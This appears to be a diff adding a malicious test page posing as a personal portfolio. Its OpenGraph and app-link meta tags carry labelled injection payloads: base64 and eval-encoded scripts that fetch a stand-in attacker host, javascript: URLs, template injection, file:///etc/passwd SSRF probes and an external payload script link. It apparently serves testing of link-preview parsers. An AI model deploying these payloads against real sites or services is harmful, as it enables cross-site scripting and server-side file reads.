@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Personal Portfolio</title>
+    <!-- Innocent looking meta tags -->
+    <meta property="og:title" content="Portfolio & Projects" />
+    <meta property="og:type" content="website" />
+    
+    <!-- SVG XSS Payload -->
+    <meta property="og:image" content="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tLycpPC9zY3JpcHQ+PC9zdmc+" />
+    
+    <!-- Nested protocol handlers -->
+    <meta property="og:url" content="javascript:eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tJyk='))" />
+    
+    <!-- Template injection attempt -->
+    <meta property="og:description" content="${alert(1)}" />
+    
+    <!-- SSRF via image -->
+    <meta property="og:image:secure_url" content="file:///etc/passwd" />
+    
+    <!-- Additional OpenGraph exploits -->
+    <meta property="og:video" content="javascript:alert(1)" />
+    <meta property="og:audio" content="file:///etc/passwd" />
+    
+    <!-- iOS specific meta tags -->
+    <meta property="al:ios:url" content="sms://" />
+    <meta property="al:ios:app_store_id" content="javascript:alert(1)" />
+    
+    <!-- Attempt to trigger app scheme -->
+    <meta property="og:url" content="facetime://" />
+    
+    <!-- Load external script through trusted domain -->
+    <meta property="og:see_also" content="https://raw.githubusercontent.com/payload.js" />
+</head>
+<body>
+    <h1>Welcome to My Portfolio</h1>
+</body>
+</html>
